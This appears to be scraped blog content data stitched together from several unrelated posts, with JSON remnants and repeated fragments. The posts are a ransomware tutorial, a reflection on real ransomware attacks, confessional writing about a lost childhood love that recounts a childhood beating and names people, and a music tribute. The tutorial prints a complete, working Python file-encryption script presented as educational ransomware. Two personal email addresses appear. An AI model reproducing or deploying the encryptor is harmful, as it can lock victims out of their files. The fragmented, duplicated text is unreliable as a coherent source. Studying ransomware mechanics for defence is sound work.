It’s a form of cyber extortion that has become increasingly prevalent, targeting individuals, businesses, and even government organizations. Once infected, victims are often left with a grim choice: pay the ransom to regain access to their files or risk losing them forever.\n\n### How Ransomware Works\n\nRansomware typically spreads through phishing emails, malicious websites, or software vulnerabilities. When the malware is executed, it begins encrypting files on the victim's system, rendering them inaccessible. A ransom note is then displayed, demanding payment in exchange for the decryption key.\n\nThe use of ransomware has evolved over the years, with cybercriminals employing more sophisticated techniques to avoid detection and increase their chances of receiving payment. Unfortunately, even after paying the ransom, there’s no guarantee that the files will be restored.\n\n## Introduction to Snakes Ransomware\n\nSnakes Ransomware is a Python-based tool I’ve developed to demonstrate the encryption and decryption processes involved in ransomware. While this project is intended purely for educational purposes, it highlights the mechanics of ransomware in a controlled environment.\n\n### Features of Snakes Ransomware\n\n- **File Encryption:** Encrypts all files in a specified folder.\n- **Key Generation:** Creates a unique key for each encryption process, which is crucial for decryption.\n- **File Decryption:** Provides a way to decrypt the previously encrypted files using the generated key.\n\n## How to Use Snakes Ransomware\n\n### Step 1: Installation\n\nFirst, ensure you have all the required dependencies installed. You can do this by running the following command in your terminal:\n\n```bash\npip install -r requirements.txt\n```\n\n### Step 2: Encryption Process\n\nTo encrypt files within a target folder:\n\n1. **Copy the Encryption Script:**\n   - Place the `snakes-encrypt.py` file into the folder you want to encrypt.\n\n2. **Execute the Script:**\n   - Open a terminal and navigate to the folder containing the script.\n   - Run the following command:\n   \n     ```bash\n     python snakes-encrypt.py\n     ```\n\n3. **Encryption Completion:**\n   - After execution, all files in the folder will be encrypted, and a key file named `snakes-key.key` will be generated. This key is essential for decrypting the files.\n\n### Step 3: Decryption Process\n\nTo decrypt the files:\n\n1. **Copy the Decryption Script:**\n   - Place the `snakes-decrypt.py` file in the folder containing the encrypted files.\n\n2. **Add the Encryption Key:**\n   - Ensure the `snakes-key.key` file is in the same directory as the decryption script.\n\n3. **Execute the Decryption Script:**\n   - Run the following command in your terminal:\n   \n     ```bash\n     python snakes-decrypt.py\n     ```\n\n4. **Decryption Completion:**\n   - The encrypted files will be restored to their original state.\n\n## How Snakes Ransomware Was Created\n\nCreating Snakes Ransomware involved a deep dive into cryptography and file handling in Python. The key aspects of the program include:\n\n\n### **Encryption Script Explanation**\n\nThis script is designed to encrypt all files in the current directory, except for the encryption script itself and the key file.\n\n#### **1. Importing Necessary Libraries:**\n```python\nimport os\nfrom cryptography.fernet import Fernet\n```\n- `os`: Used to interact with the operating system for file operations.\n- `cryptography.fernet`: A symmetric encryption method from the `cryptography` library, which is used to encrypt and decrypt files.\n\n#### **2. Listing Files to Encrypt:**\n```python\nfiles = []\n\nfor file in os.listdir():\n    if file == \"snakes-encrypt.py\" or file == \"snakes-key.key\":\n        continue\n    if os.path.isfile(file):\n        files.append(file)\nprint(files)\n```\n- The script lists all files in the current directory.\n- It excludes the encryption script (`snakes-encrypt.py`) and the key file (`snakes-key.key`) to prevent them from being encrypted.\n\n#### **3. Generating the Encryption Key:**\n```python\nkey = Fernet.generate_key()\n\nwith open(\"snakes-key.key\", \"wb\") as thekey:\n    thekey.write(key)\n```\n- A new encryption key is generated using `Fernet.generate_key()`.\n- This key is saved in a file called `snakes-key.key`. This key is essential for decrypting the files later.\n\n#### **4. Encrypting the Files:**\n```python\nfor file in files:\n    with open(file, \"rb\") as thefile:\n        contents = thefile.read()\n    contents_encrypted = Fernet(key).encrypt(contents)\n\n    with open(file, \"wb\") as thefile:\n        thefile.write(contents_encrypted)\n```\n- The script loops through each file in the `files` list.\n- It reads the contents of each file in binary mode (`\"rb\"`).\n- The contents are encrypted using the generated key.\n- The encrypted contents are then written back to the original file in binary mode (`\"wb\"`), replacing the original contents with the encrypted data.\n\n### **Complete Encryption Script**\n\nHere's the complete encryption script with comments for clarity:\n\n```python\n#!/usr/bin/env python3\n\nimport os\nfrom cryptography.fernet import Fernet\n\n# List of files to be encrypted\nfiles = []\n\n# Identify files to encrypt, excluding the script and key files\nfor file in os.listdir():\n    if file == \"snakes-encrypt.py\" or file == \"snakes-key.key\":\n        continue\n    if os.path.isfile(file):\n        files.append(file)\nprint(\"Files to be encrypted:\", files)\n\n# Generate encryption key and save it to a file\nkey = Fernet.generate_key()\n\nwith open(\"snakes-key.key\", \"wb\") as thekey:\n    thekey.write(key)\n\n# Encrypt each file\nfor file in files:\n    with open(file, \"rb\") as thefile:\n        contents = thefile.read()\n    contents_encrypted = Fernet(key).encrypt(contents)\n\n    with open(file, \"wb\") as thefile:\n        thefile.write(contents_encrypted)\n\nprint(\"Encryption completed.\")\n```\n\n\n## Conclusion\n\nRansomware remains one of the most significant threats in cybersecurity today. By understanding how it works through projects like Snakes Ransomware, we can better prepare ourselves to defend against such attacks. Remember, the Snakes Ransomware project is strictly for educational purposes, and I strongly discourage any malicious use of this knowledge.\n\nFor more insights into cybersecurity and programming, stay tuned to Krishna-Blogs!\n\n---\n[Github Repo](https://github.com/Snakes-n-Networks/Snakes-Ransomware.git) -- For referance\n\nContact: [P-mail](mailto:ekrishnachaitanya2004@gmail.com) 'or'\n        [Official-mail](mailto:snakesnnetworks@gmail.com)","src/content/blogs/adding-new-post.md","ff525c57c4ddafed",{"html":1756,"metadata":1757},"\u003Ch2 id=\"what-is-ransomware\">What is Ransomware?\u003C/h2>\n\u003Cp>Ransomware is a type of malicious software designed to block access to a computer system or encrypt its data until a sum of money, or ransom, is paid. It’s a form of cyber extortion that has become increasingly prevalent, targeting individuals, businesses, and even government organizations. Once infected, victims are often left with a grim choice: pay the ransom to regain access to their files or risk losing them forever.\u003C/p>\n\u003Ch3 id=\"how-ransomware-works\">How Ransomware Works\u003C/h3>\n\u003Cp>Ransomware typically spreads through phishing emails, malicious websites, or software vulnerabilities. When the malware is executed, it begins encrypting files on the victim’s system, rendering them inaccessible. A ransom note is then displayed, demanding payment in exchange for the decryption key.\u003C/p>\n\u003Cp>The use of ransomware has evolved over the years, with cybercriminals employing more sophisticated techniques to avoid detection and increase their chances of receiving payment. Unfortunately, even after paying the ransom, there’s no guarantee that the files will be restored.\u003C/p>\n\u003Ch2 id=\"introduction-to-snakes-ransomware\">Introduction to Snakes Ransomware\u003C/h2>\n\u003Cp>Snakes Ransomware is a Python-based tool I’ve developed to demonstrate the encryption and decryption processes involved in ransomware.

No reactions, no replies. Just read it clearly and slowly. You may think I moved on, that I’m happy, just enjoying life without you. No. Never. Not at all.\n\nThe only days I was truly happy were the days I spent with you. Those days are unforgettable. Sometimes, I can recall every single detail, from the moment I woke up to the moment I fell asleep, from the way we talked in the mornings to the way we walked together. From the moment I confessed my feelings to the moment you left. You may think it all ended when you disappeared, that I forgot, that life just went on. But you have no idea how many nights I cried, remembering every little thing, every second we spent together. You can’t even imagine that kind of sorrow.\n\nEvery single day, I listened to the same old songs. The same songs. The same songs that reminded me of you. The same songs that made me feel like I had lost everything. Just pure emptiness, a hole in my life that nothing could ever fill. Nothing changed. Nothing ever got better. I just lived in a loop—waking up, pretending I was fine, trying to act normal, and then breaking down at night, crying like hell until I couldn’t cry anymore, until my body just gave up and I fell asleep. Then I’d wake up the next morning and do it all over again.\n\nAnd then, just like that, you were gone. Without telling me. Without a goodbye.\n\nDo you know what that did to me? How could you just vanish like that? We were sitting in school, in tuition, just like every day—laughing, talking, living with no worries, no responsibilities. And then suddenly, you disappeared.\n\nI kept going to school, hoping, just hoping, that you’d come back. That I’d see you again. But no. You weren’t there.\n\nI waited. Ten days.\n\nNo school. No tuition. Nothing. I was just waiting. Then one day, Vishnu told me that you had moved to Naidupeta. That you had left a month ago.\n\nA month ago.\n\nAnd I had been sitting there, waiting, thinking you’d come back. Thinking maybe you were sick or maybe you are at home. But no. You had already left, and I had no idea.\n\nDo you know what that did to me? It was like someone had ripped a piece of my soul away, and I didn’t even get a chance to understand what was happening. I couldn’t digest it. I couldn’t believe it. One day, we were laughing together, and the next, you were gone, like you had never even been there.\n\nHow did you think I could survive without you? How did you think I could just move on?\n\nEvery night, I cried. Remembering all the good stuff. And then realizing you were no longer there. That’s when the tears really started. I cried like hell. Until I physically couldn’t anymore. Until my body was exhausted. And then I slept. And the next day, I woke up like nothing had happened. Like I was fine. Like I was normal. But I wasn’t.\n\nEverywhere I went, I saw you. The same school. The same places. The same roads. But no you. Just memories of you.\n\nI couldn’t take it anymore. I wanted to leave. I wanted to escape from that school, from that place, from everything that reminded me of you. But it was too late. I had to stay until the year was over. So I waited. Counting the days until I could finally leave.\n\nThe only person who saw what I was going through was Ketan. He knew how hard it was for me. He knew how much I was struggling. But no one else did.\n\nAnd then, finally, I left. I forced everyone to let me change schools. And I escaped.\n\nBut even after I left, I couldn’t escape you.\n\nI carried you with me. In my memories. In my dreams.\n\nEven now, I see you sometimes. Not the version of you that exists today. Not the version that sends snaps with her friends, smiling, living a happy life. No, I see the 10-year-old Harshi. The one I loved. The one I still love.\n\nAnd maybe that’s what hurts the most. That the version of you I’m holding onto isn’t even real anymore. It’s just a dream.

Sometimes, I can recall every single detail, from the moment I woke up to the moment I fell asleep, from the way we talked in the mornings to the way we walked together. From the moment I confessed my feelings to the moment you left. You may think it all ended when you disappeared, that I forgot, that life just went on.

You can’t even imagine that kind of sorrow.\u003C/p>\n\u003Cp>Every single day, I listened to the same old songs. The same songs. The same songs that reminded me of you. The same songs that made me feel like I had lost everything. Just pure emptiness, a hole in my life that nothing could ever fill. Nothing changed. Nothing ever got better. I just lived in a loop—waking up, pretending I was fine, trying to act normal, and then breaking down at night, crying like hell until I couldn’t cry anymore, until my body just gave up and I fell asleep.

It was like someone had ripped a piece of my soul away, and I didn’t even get a chance to understand what was happening. I couldn’t digest it. I couldn’t believe it.

It wasn’t just another cybersecurity concept or a weekend project—it was a rabbit hole that kept pulling me deeper. I had read about it before, knew the basics, but the more I explored, the more unsettling it became. This wasn’t just some theoretical malware; this was an entire economy, a digital form of extortion that had taken down massive corporations, crippled hospitals, and even put governments on their knees.\n\nIt started as a casual curiosity, but soon, I was consumed by a single question: How does something so devastating work? How do these attackers slip into networks, encrypt files, and demand millions in ransom payments without getting caught? And more importantly, why has no one been able to completely stop them? These questions became an obsession, leading me to build my own experimental ransomware—purely for educational purposes, of course. I needed to see, firsthand, how this beast operated.\n\n### The Dark Side of Ransomware\n\nI had heard about the big ransomware attacks, but nothing really hit me until I started researching the infamous WannaCry attack of 2017. That was a wake-up call. It infected over 200,000 computers across 150 countries, locking out businesses, government agencies, and even hospitals. Critical patient data was suddenly inaccessible, surgeries got postponed, and lives were literally put at risk—all because of a few lines of malicious code. It spread like wildfire, taking advantage of a vulnerability in Windows that had already been patched, but many systems were still unprotected. And the scariest part? The ransom demands weren’t even that high—just $300 to $600 in Bitcoin per machine. The goal wasn’t to hit one big target but to infect as many systems as possible, making a fortune in small payments.\n\nThen came NotPetya, a different kind of monster. Unlike WannaCry, which at least pretended to offer decryption keys after payment, NotPetya was pure destruction. It wiped out entire infrastructures, taking down huge corporations like Maersk, a major shipping company, and even pharmaceutical giant Merck. Maersk alone lost over $300 million because of it. The attack originated in Ukraine, supposedly targeting local businesses, but it didn’t stop there. It spread globally, proving that ransomware wasn’t just a criminal enterprise—it was becoming a weapon of cyber warfare.\n\nAt this point, I was horrified. These weren’t just attacks; they were economic disasters, capable of bringing down entire industries overnight. And the worst part? The people behind these attacks were often untouchable, hiding behind layers of anonymity, using cryptocurrency to cover their tracks, and leveraging underground forums to distribute their malware.\n\n### My Experience with Snakes Ransomware\n\nWith all this knowledge swirling in my head, I decided to get hands-on. I wanted to build a ransomware simulation, something that could encrypt and decrypt files just to understand the mechanics. That’s when I created [Snakes Ransomware](../Understanding-Ransomware-and-a-Dive-into-Snakes-Ransomware/)—a simple Python-based tool that mimicked the core functionality of real ransomware. The moment I ran my first encryption test, I felt a chill. In just seconds, every file in my test directory was unreadable. Gone. Just like that. And the only way to get them back? The decryption key.\n\nThat’s when it really hit me—how terrifyingly easy it was to lock someone out of their own data. A few lines of code, a simple script running in the background, and an entire system could be held hostage. No elaborate hacking, no deep network penetration, just a simple execution and boom—game over.\n\nI kept refining my project, improving the encryption method, experimenting with key storage mechanisms, and testing different payload delivery methods. The deeper I went, the more I realized how trivial it was to modify the attack vectors. Phishing emails, malicious links, fake software updates—there were countless ways to deliver ransomware, and they all worked because of one simple fact: human error.\n\nNo matter how advanced cybersecurity systems get, they can’t fully protect against an employee clicking the wrong link or downloading the wrong attachment. And cybercriminals know this. That’s why they don’t just rely on zero-day exploits; they exploit human psychology, fear, urgency, and deception to trick people into opening the door for them.\n\n### The Reality of Modern Ransomware\n\nWhat’s even more disturbing is how ransomware has evolved into a business model. These aren’t just lone hackers sitting in dark rooms—they’re organized groups running ransomware-as-a-service (RaaS) operations. They develop ransomware and lease it out to affiliates, who then execute attacks and split the profits. It’s a full-fledged industry, with customer support, negotiation tactics, and even “ethical” guidelines (some groups refuse to attack hospitals or schools, as if that makes them any less criminal).\n\nAnd the payouts? Insane. Some organizations pay millions just to get their data back. The Colonial Pipeline attack in 2021, for example, forced one of the largest fuel suppliers in the U.S. to shut down operations, leading to fuel shortages and panic buying. They ended up paying a $4.4 million ransom just to restore their systems.\n\nBut here’s the kicker—paying the ransom doesn’t always work. Sometimes the decryption key doesn’t restore all files. Sometimes attackers take the money and vanish. And sometimes, even after payment, companies get hit again because they’re now seen as an easy target. It’s a lose-lose situation.\n\n### Is It Really That Easy to Ransom Someone’s Computer?\n\nAfter everything I learned, one thought kept nagging me: Is it really this easy to ransom someone’s computer in today’s world? And the answer is, unfortunately, yes. It’s disturbingly easy. Cybercriminals don’t need deep technical skills anymore. With RaaS, anyone with access to the dark web and a bit of Bitcoin can launch their own ransomware campaign. Automated tools handle the encryption, the ransom notes, and even the payment processing. Everything is streamlined.\n\nAnd as long as people keep paying, the attacks will keep coming. Companies, governments, individuals—no one is safe. The only real defense is preparation: regular backups, strict access controls, and constant vigilance. But even then, the threat is always there, lurking, waiting for the right moment to strike.\n\nThis journey into ransomware has been an eye-opener, a reminder that cybersecurity isn’t just about firewalls and antivirus software—it’s a constant battle of knowledge, deception, and risk. And in this digital age, one wrong click can cost millions.\n\nRansomware isn’t just a piece of code. It’s a weapon.

What happened next was unexpected—she answered. A conversation filled with old memories, hidden emotions, and truths I didn’t know I needed to hear. But was it everything I had hoped for? Or just another moment that left me questioning everything?",["Date","2025-03-03T22:23:00.000Z"],[47,748,275,276],"Again, I couldn’t hold back. I was thinking about her all the time, and this time, I decided to make a call. No matter what she thinks, I didn’t care anymore. I just wanted to hear her voice. I was sure she would pick up, thinking today was my birthday. And guess what? She actually did.\n\n“Happy birthday, ra.”\n\nI almost laughed. “It was yesterday, not today. And you just made it worse by wishing me now.”\n\nShe hesitated for a second and then said, “Hey, I actually remembered, but I wasn’t sure about the date. That’s why I messaged you on March 1st to confirm. Then I saw your birthdate on Snapchat as March 3rd and got confused.”\n\nSee how funny this is? She said it so casually while I had spent the whole day waiting for her wish, overthinking every second of it. She tried making an excuse, and I couldn’t help but wonder—how can she talk to me this comfortably? How?\n\nThen, she suddenly asked about Pooja’s marriage. I told her that Pooja was finally getting married to my brother. They had been in love since childhood while studying at “The School.”\n\nShe was shocked.\n\nAnd then, I was shocked.\n\nShe had no idea about this. I explained everything, and she was surprised that she had forgotten something so significant. But it wasn’t a big deal. Then, as usual, she started questioning me—like she always does. But this time, I stopped her. “No, don’t ask me anything. This time, it’s my turn to talk.”\n\nShe laughed. “Okay, fine. Ask me.”\n\nSo, I did. I asked her how her father was. He had some health issues, and I wanted to know if he was taking rest. She told me that he wasn’t working anymore and that the family was relying on her now. That hit me. I didn’t expect her to say that. “How are you managing everything then?” I asked.\n\n“That’s the only thing I’m worried about,” she said. “Everything is on me now.”\n\nI joked, “You? Handling everything? Haha.”\n\nShe laughed. “Yes.”\n\nThen I told her, “You’re just enjoying your life, man. From morning to night, you chill, and your day is done perfectly. But me? I have to do everything. Outside work like my father, and home maintenance like my mother—cleaning, cooking, everything.”\n\nShe found that hilarious. “Do you even cook?”\n\n“No, apart from that, everything.”\n\n“That’s good,” she said. “Your wife will be lucky.”\n\nMy smile faded. “Marriage isn’t for me. I’m not getting married.”\n\nShe laughed, but she had no idea how serious I was. How could she joke about this? She probably doesn’t even know how obsessed I am with her. I can’t imagine anyone else in my life apart from her.\n\nThen, out of nowhere, she said, “We’ll meet if possible. I might come to a wedding near your town, so I’ll catch up with you that day.”\n\nI just smiled and stayed quiet. She says things like this so casually, but she never actually meets me. And even if she did, I don’t want to see her. I’ve struggled for years trying to move on, and if I see her again, I won’t be able to hold back. I’ve suffered enough.\n\nJust like that, she started asking about our common friends—Albin, Vishnu, Tausif, Siddhu. She wanted to know where they were, if I still met them. And then, out of nowhere, she asked about Jathin.\n\nI was shocked.\n\nJathin? That junior who had a slight attraction to her? She still remembers him? That disappointed me. “He’s the only reason I didn’t join the same college as Her,” I told her. “And the scar on my shoulder? It’s because of him.”\n\nShe was confused. “What? What did he do to you?”\n\nI froze.\n\nShe didn’t remember? The scar on my shoulder—she was right there when it happened. She saw my mom hitting me. She saw how her bangle broke and a piece of it pierced my back. She was there, watching, feeling bad for me. And now? She doesn’t even remember it.\n\nI didn’t want to remind her, so I said, “Don’t ask about it.”\n\nBut she wouldn’t stop. She kept asking, like a child repeating the same question over and over again. Did she really forget? Or was she trying to hear it from me?\n\nI told her to wait. “I have a call waiting,” I lied. I needed a moment to think. Then I called her back—but this time, she didn’t pick up.\n\nA few minutes later, she called me back. What a miracle. She actually clicked on my name and called me.\n\nI picked up. “Where did you go in just one minute?”\n\nShe gave me some reason. I didn’t even care. I was just amused that she gave me an answer.\n\nThen the call was about to end, but she mentioned something. “I have an exam today for a company that offers an 18 LPA package.”\n\n“Send me the questions,” I joked. “I’ll try to solve them for you.”\n\nShe laughed. “Okay, I will.”\n\nAnd then, before hanging up, she asked me again, “Why do you hate Jathin? What happened that day?”\n\nSo she really wanted to hear it.\n\nI took a deep breath and told her.\n\n“When we were in tuition, that idiot Jathin did something—I don’t even remember what it was. But I got back at him. And then he ran straight to my mom and told her, ‘Your son Chaitu loves Harshi and proposed to her.’”\n\nI paused. “The next day, my mom came to my school. She took me to an empty classroom with Vishnu’s mom and started questioning me. Then she hit me. I cried, but I didn’t say a word.”\n\nI could feel her listening. So, I continued.\n\n“When she got tired, she finally asked me, ‘Is anything like this happening in your class?’ And I replied, ‘Vishnu and Deepika.’”\n\nHarshi laughed. “What? You actually said that?”\n\n“Yeah. So my mom called Vishnu next and replaced me with him. I was satisfied. But then Vishnu, after coming back, sent Albin instead of himself.”\n\nShe laughed again.\n\n“But the real thing happened when I got home,” I said. “My mom started beating me again. This time, with a curtain rod. Then later, when you came to tuition at my house, my mom called you inside and made you sit in front of me while she hit me again.”\n\nShe went silent.\n\n“You looked so shocked, like you didn’t understand why she was hitting me that badly. And then, suddenly, her bangle broke, and a piece of it got stuck in my shoulder. That’s where the scar came from.”\n\nShe was still silent. Then, suddenly, she said, “Someone’s calling me. I’ll call you back in five minutes.”\n\nI waited.\n\nI knew she wouldn’t call back. But still, I waited.\n\nBut you know what? That was a good call. It made me happy.","src/content/blogs/suddden-call.md","a0c06cf862cf685f",{"html":1936,"metadata":1937},"\u003Cp>Again, I couldn’t hold back.

Feels like the earth just collapsed, and underneath, I'm falling into a dream world where his music never stops, where ‘Die for You' still echoes through the night, where ‘After Hours’ still feels like it dropped yesterday.\n\nEvery song reminds me of a moment I lived, like a time machine to the past. The first time I heard ‘House of Balloons,’ I didn’t just listen—I felt it. The darkness, the pain, the raw honesty—it was like stepping into another universe. And with every album after that, he gave us pieces of himself, turning our emotions into melodies. ‘Starboy’ was confidence, ‘Dawn FM’ was acceptance, ‘My Dear Melancholy’ was heartbreak in its purest form.\n\nAbel’s journey, from a kid in Scarborough to the biggest artist in the world, wasn’t just inspiring—it was personal. It was proof that someone could take all the pain, all the loneliness, and turn it into something beautiful. His music wasn’t just beats and lyrics; it was pain, love, chaos, addiction, self-destruction, and redemption—all wrapped in melodies that hit straight to the soul.\n\nAnd now, he’s ready to move on. Abel Tesfaye doesn’t need The Weeknd to survive anymore. I get it. But man, how do WE move on? His music was there for us through heartbreaks, late-night drives, and moments when life didn’t make sense. It gave us comfort, a place to belong. And now, it’s just… over?\n\nBut maybe that’s the thing about legends—they never truly leave. The Weeknd might be ending, but his music, his impact, his legacy—that will live forever. We’ll still be here, playing ‘Call Out My Name’ on repeat, lost in the world he created, remembering every lyric that once felt like it was written just for us.\n\nSo, thank you, Abel.
